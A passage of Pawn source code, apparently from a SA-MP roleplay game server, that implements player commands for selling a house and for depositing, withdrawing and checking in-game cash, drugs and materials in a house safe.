		format(string,sizeof(string),"* %s presses a button next to the door, ringing the doorbell of %s's house.",GetPlayerNameEx(playerid), HouseInfo[h][hOwner]);
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	return 1;
}

CMD:sellmyhouse(playerid, params[])
{
    new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
    if((PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) || (PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)) {
	    new
			string[128],
			giveplayerid,
			price;

	    if(sscanf(params, "ud", giveplayerid, price))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellmyhouse [playerid/partofname] [price]");

        if(price < 1)
			return SendClientMessage(playerid, COLOR_GREY, "Price must be higher than 0.");

        if(!IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "Player is currently not connected to the server.");

		if(PlayerInfo[giveplayerid][pHouse] != INVALID_HOUSE_ID)
			return SendClientMessage(playerid, COLOR_GRAD5, "They already own a house.");

        if(PlayerInfo[giveplayerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[giveplayerid][pHouse]][hOwner], true) == 0)
			return SendClientMessage(playerid, COLOR_GREY, "They already own a house.");

        new
			house = PlayerInfo[playerid][pHouse],
			house2 = PlayerInfo[playerid][pHouse2];

        if(PlayerInfo[giveplayerid][pLevel] >= HouseInfo[PlayerInfo[playerid][pHouse]][hLevel]) {
			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house][hExteriorX],HouseInfo[house][hExteriorY],HouseInfo[house][hExteriorZ])) {
					if(GetPVarInt(playerid, "SellMyTimer") > 0) {
						format(string, sizeof(string), "You must wait %d seconds before offering a sale again.", GetPVarInt(playerid, "SellMyTimer"));
						SendClientMessage(playerid,COLOR_GREY,string);
						return 1;
					}
					HouseOffer[giveplayerid] = playerid;
					HousePrice[giveplayerid] = price;
					House[giveplayerid] = 1;
					format(string, sizeof(string), "* You offered %s to buy your house for $%d.", GetPlayerNameEx(giveplayerid), price);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s has offered you their house for $%d, (type /accept house) to buy.", GetPlayerNameEx(playerid), price);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					SetPVarInt(playerid, "SellMyTimer", 30); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMYTIMER);
				}  else if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house2][hExteriorX],HouseInfo[house2][hExteriorY],HouseInfo[house2][hExteriorZ])) {
					HouseOffer[giveplayerid] = playerid;
					HousePrice[giveplayerid] = price;
					House[giveplayerid] = 2;
					format(string, sizeof(string), "* You offered %s to buy your house for $%d.", GetPlayerNameEx(giveplayerid), price);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s has offered you their house for $%d, (type /accept house) to buy.", GetPlayerNameEx(playerid), price);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				} else SendClientMessage(playerid, COLOR_GREY, "You're not near your house");
			} else SendClientMessage(playerid, COLOR_GREY, "That player is not near you.");
        } else SendClientMessage(playerid, COLOR_GREY, "The player you're trying to sell your house to is not the appropriate level to buy this house.");
    } else SendClientMessage(playerid, COLOR_WHITE, "You don't own a house.");
    return 1;
}

CMD:hwithdraw(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));

	new string[128], amount, choice[32];

	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hwithdraw [name] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Names: Cash, Pot, Crack, Materials");
		return 1;
	}

	PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
	PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
	GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
	GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
	GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
		{
			if(strcmp(choice, "Cash", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]-=amount;
					PlayerInfo[playerid][pCash] += amount;
					format(string, sizeof(string), "You have withdrawn $%d from your house money safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some money from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn $%d from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough money to withdraw.");
				}
			}
			else if(strcmp(choice, "Pot", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hPot] >= amount)
				{
					if(PlayerInfo[playerid][pPot] > 500)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You're already carrying 500 grams of pot.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pPot] > 500)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You can't carry more than 500 grams of pot.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hPot]-=amount;
					PlayerInfo[playerid][pPot] += amount;
					format(string, sizeof(string), "You have withdrawn %d grams of pot from your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some pot from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of pot from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough pot to withdraw.");
				}
			}
			else if(strcmp(choice, "Materials", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials]-=amount;
					PlayerInfo[playerid][pMats] += amount;
					format(string, sizeof(string), "You have withdrawn %d materials from your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some materials from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d materials from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough materials to withdraw.");
				}
			}
			else if(strcmp(choice, "Crack", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hCrack] >= amount)
				{
					if(PlayerInfo[playerid][pCrack] > 250)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You already have 250 grams of crack.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pCrack] > 250)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You can't carry more than 250 grams of crack.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hCrack]-=amount;
					PlayerInfo[playerid][pCrack] += amount;
					format(string, sizeof(string), "You have withdrawn %d grams of crack from your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some crack from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of crack from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough crack to withdraw.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hwithdraw [name] [amount]");
				SendClientMessage(playerid, COLOR_GRAD2, "Available Names: Cash, Pot, Crack, Materials");
			}
		}
	}


	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
		{
			if(strcmp(choice, "Cash", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney]-=amount;
					PlayerInfo[playerid][pCash] += amount;
					format(string, sizeof(string), "You have withdrawn $%d from your house money safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some money from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn $%d from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough money to withdraw.");
				}
			}
			else if(strcmp(choice, "Pot", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hPot] >= amount)
				{
					if(PlayerInfo[playerid][pPot] > 500)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You already have 500 grams of pot.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pPot] > 500)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You can't carry more than 500 grams of pot.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hPot]-=amount;
					PlayerInfo[playerid][pPot] += amount;
					format(string, sizeof(string), "You have withdrawn %d grams of pot from your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some pot from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of pot from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough pot to withdraw.");
				}
			}
			else if(strcmp(choice, "Materials", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials]-=amount;
					PlayerInfo[playerid][pMats] += amount;
					format(string, sizeof(string), "You have withdrawn %d materials from your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some materials from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d materials from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough materials to withdraw.");
				}
			}
			else if(strcmp(choice, "Crack", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't withdraw less than one.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack] >= amount)
				{
					if(PlayerInfo[playerid][pCrack] > 250)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You already have 250 grams of crack.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pCrack] > 250)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You can't carry more than 250 grams of pot.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack]-=amount;
					PlayerInfo[playerid][pCrack] += amount;
					format(string, sizeof(string), "You have withdrawn %d grams of crack from your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s withdraws some crack from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of crack from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough crack to withdraw.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hwithdraw [name] [amount]");
				SendClientMessage(playerid, COLOR_GRAD2, "Available Names: Cash, Pot, Crack, Materials");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not in any house");
		return 1;
	}
	return 1;
}

CMD:hdeposit(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hdeposit [name] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Names: Cash, Pot, Crack, Materials");
		return 1;
	}

	PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
	PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
	GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
	GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
	GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
		{
			if(strcmp(choice, "Cash", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pCash] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+=amount;
					PlayerInfo[playerid][pCash] -= amount;
					format(string, sizeof(string), "You have deposited $%d in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some money and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited $%d into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough money to deposit.");
				}
			}
			else if(strcmp(choice, "Pot", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pPot] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "You can't deposit more than 25 grams at a time!");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse]][hPot] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Your house safe is already full of pot!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hPot]+=amount;
					PlayerInfo[playerid][pPot] -= amount;
					format(string, sizeof(string), "You have deposited %d grams of pot in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some pot and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of pot into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough pot to deposit.");
				}
			}
			else if(strcmp(choice, "Materials", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pMats] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials]+=amount;
					PlayerInfo[playerid][pMats] -= amount;
					format(string, sizeof(string), "You have deposited %d materials in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some materials and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d materials into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough materials to deposit.");
				}
			}
			else if(strcmp(choice, "Crack", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pCrack] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "You can't deposit more than 25 grams at a time!");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse]][hCrack] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Your house safe is already full of crack!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hCrack]+=amount;
					PlayerInfo[playerid][pCrack] -= amount;
					format(string, sizeof(string), "You have deposited %d grams of crack in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some crack and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of crack into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough crack to deposit.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hdeposit [name] [amount]");
				SendClientMessage(playerid, COLOR_GRAD2, "Available Names: Cash, Pot, Crack, Materials");
			}
		}
	}
	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			if(strcmp(choice, "Cash", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pCash] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney]+=amount;
					PlayerInfo[playerid][pCash] -= amount;
					format(string, sizeof(string), "You have deposited $%d in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some money and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited $%d into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough money to deposit.");
				}
			}
			else if(strcmp(choice, "Pot", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pPot] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "You can't deposit more than 25 grams at a time!");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse2]][hPot] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Your house safe is already full of pot!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hPot]+=amount;
					PlayerInfo[playerid][pPot] -= amount;
					format(string, sizeof(string), "You have deposited %d grams of pot in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some pot and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of pot into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough pot to deposit.");
				}
			}
			else if(strcmp(choice, "Materials", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pMats] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials]+=amount;
					PlayerInfo[playerid][pMats] -= amount;
					format(string, sizeof(string), "You have deposited %d materials in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some materials and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d materials into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough materials to deposit.");
				}
			}
			else if(strcmp(choice, "Crack", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't deposit less than one.");
					return 1;
				}
				if(PlayerInfo[playerid][pCrack] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "You can't deposit more than 25 grams at a time!");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Your house safe is already full of crack!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack]+=amount;
					PlayerInfo[playerid][pCrack] -= amount;
					format(string, sizeof(string), "You have deposited %d grams of crack in your house safe.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s takes out some crack and puts it in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of crack into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have enough crack to deposit.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hdeposit [name] [amount]");
				SendClientMessage(playerid, COLOR_GRAD2, "Available Names: Cash, Pot, Crack, Materials");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not in any house");
	}
	return 1;
}

CMD:hbalance(playerid, params[])
{
	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
		{
			new weaponsinlocker;
			for(new s = 0; s < 5; s++)
			{
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][s] != 0)
				{
					weaponsinlocker++;
				}
			}
			new string[80];
			format(string, sizeof(string), "Gunlocker(s): %d/%d | Cash: $%d | Pot: %d | Crack: %d | Materials: %d", weaponsinlocker,HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade], HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney], HouseInfo[PlayerInfo[playerid][pHouse]][hPot], HouseInfo[PlayerInfo[playerid][pHouse]][hCrack], HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}

